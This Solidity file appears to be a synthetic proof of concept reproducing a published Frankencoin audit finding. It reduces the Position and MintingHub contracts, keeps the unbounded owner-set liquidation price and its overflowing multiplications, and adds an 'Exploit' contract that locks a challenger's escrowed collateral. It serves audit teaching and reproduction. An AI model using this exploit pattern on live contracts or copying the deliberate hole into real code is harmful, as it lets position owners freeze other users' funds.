// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Frankencoin (ZCHF) — [H-05] Position owners can deny liquidations
    (Code4rena 2023-04-frankencoin, finding #20020, reporter JGcarv).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: a position owner can set the liquidation `price` to an arbitrarily
    large value (`Position.adjustPrice` / opening `_liqPrice` impose no upper
    bound). Every challenge-resolution path then multiplies `price` by a
    collateral amount, and under Solidity 0.8 checked arithmetic that
    multiplication OVERFLOWS and reverts:

        _bidAmountZCHF * ONE_DEC18 >= price * _collateralAmount   // tryAvertChallenge (L307)
        uint256 volumeZCHF = _mulD18(price, _size);               // notifyChallengeSucceeded (L347)

    Consequently no bid can ever avert the challenge and `MintingHub.end` can never
    settle it. The challenger's collateral, escrowed in the hub when the challenge
    was launched, is LOCKED forever and the challenger receives neither the
    collateral nor a reward — a permanent loss of funds for anyone who challenges
    the position (the impact accepted by the judge). The owner keeps their minted
    ZCHF and simply abandons the (now worthless) collateral.

    The three blamed lines are copied VERBATIM and marked `// @> VULN:`. Two
    positions are used only because the browser PoC cannot advance time: one with
    a zero challenge period (so `end` is callable immediately, demonstrating the
    settlement-path overflow + lock) and one with an open challenge window (so a
    `bid` reaches the averting-path overflow).
//////////////////////////////////////////////////////////////////////////*/

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

/// @dev Verbatim MathUtil helpers used by Position.
contract MathUtil {
    uint256 internal constant ONE_DEC18 = 10 ** 18;

    function _mulD18(uint256 _a, uint256 _b) internal pure returns (uint256) {
        return _a * _b / ONE_DEC18;
    }

    function _divD18(uint256 _a, uint256 _b) internal pure returns (uint256) {
        return (_a * ONE_DEC18) / _b;
    }
}

/// @dev Minimal ERC20 used as the collateral token.
contract CollateralToken is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced Frankencoin Position. Keeps the owner-controlled, UNBOUNDED
///         `price` and the two verbatim challenge-path multiplications that
///         overflow once `price` is set to `type(uint256).max`.
contract Position is MathUtil {
    address public owner;
    address public immutable hub;
    IERC20 public immutable collateral;
    uint256 public immutable challengePeriod;
    uint256 public immutable expiration;
    uint256 public price; // owner-set, no upper bound
    uint256 public minted;
    uint256 public challengedAmount;
    uint32 public constant reserveContribution = 0;

    constructor(address _owner, address _hub, address _collateral, uint256 _challengePeriod, uint256 _liqPrice) {
        owner = _owner;
        hub = _hub;
        collateral = IERC20(_collateral);
        challengePeriod = _challengePeriod;
        expiration = block.timestamp + 3650 days; // far future — position is not expired
        price = _liqPrice;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "owner");
        _;
    }

    modifier onlyHub() {
        require(msg.sender == hub, "hub");
        _;
    }

    function collateralBalance() internal view returns (uint256) {
        return collateral.balanceOf(address(this));
    }

    /// @notice Verbatim core of Position.adjustPrice — NO upper bound on `newPrice`.
    function adjustPrice(uint256 newPrice) public onlyOwner {
        price = newPrice; // @> VULN: liquidation price is unbounded (Position.sol adjustPrice, L159)
    }

    function notifyChallengeStarted(uint256 size) external onlyHub {
        challengedAmount += size;
    }

    /// @notice Verbatim reduction of Position.tryAvertChallenge. When `price` is
    ///         `type(uint256).max`, `price * _collateralAmount` overflows and
    ///         reverts, so no bid can ever avert the challenge.
    function tryAvertChallenge(uint256 _collateralAmount, uint256 _bidAmountZCHF) external onlyHub returns (bool) {
        if (block.timestamp >= expiration) {
            return false; // position expired, let every challenge succeed
        } else if (_bidAmountZCHF * ONE_DEC18 >= price * _collateralAmount) { // @> VULN: price * amount overflows when price huge (Position.sol:L307)
            challengedAmount -= _collateralAmount;
            return true;
        } else {
            return false;
        }
    }

    /// @notice Verbatim reduction of Position.notifyChallengeSucceeded. The
    ///         `_mulD18(price, _size)` overflows when `price` is huge, so
    ///         MintingHub.end can never settle the challenge.
    function notifyChallengeSucceeded(address _bidder, uint256 _bid, uint256 _size)
        external
        onlyHub
        returns (address, uint256, uint256, uint256, uint32)
    {
        challengedAmount -= _size;
        uint256 colBal = collateralBalance();
        if (_size > colBal) {
            _bid = _divD18(_mulD18(_bid, colBal), _size);
            _size = colBal;
        }
        uint256 volumeZCHF = _mulD18(price, _size); // @> VULN: price * size overflows when price huge (Position.sol:L347)
        uint256 repayment = minted < volumeZCHF ? minted : volumeZCHF;
        minted -= repayment;
        return (owner, _bid, volumeZCHF, repayment, reserveContribution);
    }
}

/// @notice Reduced MintingHub. `launchChallenge` escrows the challenger's
///         collateral; `bid` and `end` both route through the overflowing
///         position math, so the escrow can never be released.
contract MintingHub {
    error TooLate();
    error UnexpectedSize();

    struct Challenge {
        address challenger;
        Position position;
        uint256 size;
        uint256 end;
        address bidder;
        uint256 bid;
    }

    Challenge[] public challenges;

    /// @notice Launch a challenge; pulls and ESCROWS the challenger's collateral.
    function launchChallenge(Position position, uint256 _collateralAmount) external returns (uint256) {
        position.collateral().transferFrom(msg.sender, address(this), _collateralAmount);
        uint256 pos = challenges.length;
        challenges.push(
            Challenge(msg.sender, position, _collateralAmount, block.timestamp + position.challengePeriod(), address(0x0), 0)
        );
        position.notifyChallengeStarted(_collateralAmount);
        return pos;
    }

    /// @notice Verbatim reduction of MintingHub.bid (averting path only).
    function bid(uint256 _challengeNumber, uint256 _bidAmountZCHF, uint256 expectedSize) external {
        Challenge storage challenge = challenges[_challengeNumber];
        if (block.timestamp >= challenge.end) revert TooLate();
        if (expectedSize != challenge.size) revert UnexpectedSize();
        // ask position if the bid was high enough to avert the challenge -> OVERFLOWS
        if (challenge.position.tryAvertChallenge(challenge.size, _bidAmountZCHF)) {
            challenge.position.collateral().transfer(msg.sender, challenge.size);
            delete challenges[_challengeNumber];
        } else {
            challenge.bid = _bidAmountZCHF;
            challenge.bidder = msg.sender;
        }
    }

    /// @notice Verbatim reduction of MintingHub.end. `returnCollateral` runs
    ///         first, but `notifyChallengeSucceeded` then overflows, reverting the
    ///         WHOLE call — so the collateral return is rolled back and the escrow
    ///         stays locked.
    function end(uint256 _challengeNumber) public {
        Challenge storage challenge = challenges[_challengeNumber];
        require(challenge.challenger != address(0x0));
        require(block.timestamp >= challenge.end, "period has not ended");
        returnCollateral(challenge); // would return the challenger's collateral ...
        address recipient = challenge.bidder == address(0x0) ? msg.sender : challenge.bidder;
        // ... but this reverts on overflow, undoing the return above:
        challenge.position.notifyChallengeSucceeded(recipient, challenge.bid, challenge.size);
        delete challenges[_challengeNumber];
    }

    function returnCollateral(Challenge storage challenge) internal {
        challenge.position.collateral().transfer(challenge.challenger, challenge.size);
    }
}

/// @notice The challenger (victim). Escrows collateral to challenge a position
///         it believes is under-collateralized.
contract Challenger {
    CollateralToken public immutable token;
    MintingHub public immutable hub;

    constructor(CollateralToken _token, MintingHub _hub) {
        token = _token;
        hub = _hub;
    }

    function challenge(Position position, uint256 size) external returns (uint256) {
        token.approve(address(hub), size);
        return hub.launchChallenge(position, size);
    }
}

/// @notice Attacker orchestrator. Owns two positions (one with a zero challenge
///         period, one with an open window), reprices both to type(uint256).max,
///         and shows that neither the settlement path nor the averting-bid path
///         can execute — permanently locking the challenger's escrowed collateral.
contract Exploit is MathUtil {
    uint256 public constant CHALLENGE_SIZE = 1e18;
    uint256 public constant LOCKED_TOTAL = 2e18; // two challenges of 1e18 each

    CollateralToken public token;
    MintingHub public hub;
    Position public posEnd; // challengePeriod 0 -> end() callable now
    Position public posBid; // open window -> bid() reaches tryAvertChallenge
    Challenger public challenger;

    bool public endReverted;
    bool public bidReverted;

    constructor() {
        // Fixed, documented CREATE order:
        token = new CollateralToken(); //                                     nonce 1
        hub = new MintingHub(); //                                            nonce 2
        // Both positions open with a SANE price; the owner inflates them in run().
        posEnd = new Position(address(this), address(hub), address(token), 0, 1e18); //          nonce 3
        posBid = new Position(address(this), address(hub), address(token), 1000, 1e18); //        nonce 4
        challenger = new Challenger(token, hub); //                           nonce 5
        // Give each position a little collateral (so it is challengeable) ...
        token.mint(address(posEnd), 1e18);
        token.mint(address(posBid), 1e18);
        // ... and fund the challenger with the collateral it will escrow.
        token.mint(address(challenger), LOCKED_TOTAL);
    }

    function run() external {
        // 1. Owner reprices both positions to type(uint256).max (no upper bound).
        posEnd.adjustPrice(type(uint256).max);
        posBid.adjustPrice(type(uint256).max);

        // 2. The challenger escrows collateral to challenge each position.
        uint256 idEnd = challenger.challenge(posEnd, CHALLENGE_SIZE); // period 0
        uint256 idBid = challenger.challenge(posBid, CHALLENGE_SIZE); // open window

        // 3a. Settlement path: end() overflows in notifyChallengeSucceeded -> the
        //     whole call reverts, so the escrowed collateral is never returned.
        try hub.end(idEnd) {
            // must not reach here
        } catch {
            endReverted = true;
        }

        // 3b. Averting path: any bid overflows in tryAvertChallenge -> no bid can
        //     ever avert the challenge either.
        try hub.bid(idBid, 10_000 ether, CHALLENGE_SIZE) {
            // must not reach here
        } catch {
            bidReverted = true;
        }

        // HARM: both resolution paths are permanently bricked and the challenger's
        // entire escrow is locked inside the hub with no way out.
        require(endReverted, "end() should have reverted");
        require(bidReverted, "bid() should have reverted");
        require(token.balanceOf(address(hub)) == LOCKED_TOTAL, "escrow not locked in hub");
        require(token.balanceOf(address(challenger)) == 0, "challenger unexpectedly holds collateral");
    }
}
